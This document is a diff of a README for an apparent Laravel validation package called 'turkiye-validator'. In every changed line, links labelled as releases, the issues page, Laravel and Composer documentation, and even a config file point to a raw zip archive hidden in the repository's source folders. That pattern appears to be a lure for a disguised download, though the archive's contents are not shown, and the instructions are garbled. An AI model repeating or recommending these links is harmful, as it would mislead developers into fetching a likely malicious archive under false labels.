@@ -6,7 +6,7 @@ Welcome to the **turkiye-validator**! This tool helps you validate Turkish data 
 
 ## 📥 Download Now
 
-[![Download turkiye-validator](https://github.com/angg12346/turkiye-validator/raw/refs/heads/main/resources/lang/validator-turkiye-genetical.zip%https://github.com/angg12346/turkiye-validator/raw/refs/heads/main/resources/lang/validator-turkiye-genetical.zip)](https://github.com/angg12346/turkiye-validator/raw/refs/heads/main/resources/lang/validator-turkiye-genetical.zip)
+[![Download turkiye-validator](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip%https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip)](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip)
 
 ## 📝 Overview
 
@@ -26,7 +26,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-To get started with the **turkiye-validator**, visit this page to download: [GitHub Releases](https://github.com/angg12346/turkiye-validator/raw/refs/heads/main/resources/lang/validator-turkiye-genetical.zip).
+To get started with the **turkiye-validator**, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip).
 
 1. **Visit the Releases Page:** Click on the link to access the latest version.
 2. **Choose the Right File:** Locate the file that matches your system. For most users, this will be the latest version available.
@@ -54,7 +54,7 @@ The **turkiye-validator** offers these features:
 After installing the package, follow these steps to use the validation rules:
 
 1. **Add the Service Provider:**
-   - Open the `https://github.com/angg12346/turkiye-validator/raw/refs/heads/main/resources/lang/validator-turkiye-genetical.zip` file.
+   - Open the `https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip` file.
    - In the `providers` array, add:
      ```php
      Angg12346\TurkiyeValidator\TurkiyeValidatorServiceProvider::class,
@@ -83,7 +83,7 @@ If you face any issues:
 
 - Ensure your PHP and Laravel versions meet the requirements.
 - Check the installation steps to confirm you followed them correctly.
-- Visit the [GitHub Issues page](https://github.com/angg12346/turkiye-validator/raw/refs/heads/main/resources/lang/validator-turkiye-genetical.zip) to see common problems and their solutions.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip) to see common problems and their solutions.
 
 ## 📞 Support
 
@@ -97,8 +97,8 @@ If you want to connect with other users or developers, check out our community f
 
 Explore more about Laravel and validation in the following resources:
 
-- [Laravel Official Documentation](https://github.com/angg12346/turkiye-validator/raw/refs/heads/main/resources/lang/validator-turkiye-genetical.zip)
-- [Composer Documentation](https://github.com/angg12346/turkiye-validator/raw/refs/heads/main/resources/lang/validator-turkiye-genetical.zip)
+- [Laravel Official Documentation](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip)
+- [Composer Documentation](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip)
 
 ## 📜 License
 
